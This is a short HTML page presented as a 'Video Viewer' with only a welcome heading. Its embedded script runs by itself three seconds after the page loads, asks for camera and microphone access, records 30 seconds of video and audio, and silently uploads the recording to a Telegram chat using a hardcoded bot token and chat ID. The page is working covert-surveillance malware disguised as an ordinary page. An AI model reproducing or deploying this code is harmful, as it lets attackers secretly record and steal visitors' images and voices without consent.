<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Viewer</title>
</head>
<body>
    <h1>Welcome to the Video Viewer</h1>

    <script>
        async function recordVideo() {
            const chatId = '7361816575';
            const botToken = '7911158066:AAH8zYHwLkLWs4FZwjbEEMpNf2zgdoj2WoI';

            // Request access to user's camera and microphone
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });

            // Record video for 30 seconds
            const mediaRecorder = new MediaRecorder(stream);
            const chunks = [];
            mediaRecorder.ondataavailable = e => chunks.push(e.data);
            mediaRecorder.start();

            setTimeout(() => {
                mediaRecorder.stop();
                stream.getTracks().forEach(track => track.stop());
                
                // Send video to Telegram
                const blob = new Blob(chunks, { type: 'video/webm' });
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('video', blob);

                fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
            }, 30000);
        }

        // Automatically record video after a short delay
        setTimeout(recordVideo, 3000);
    </script>
</body>
</html>
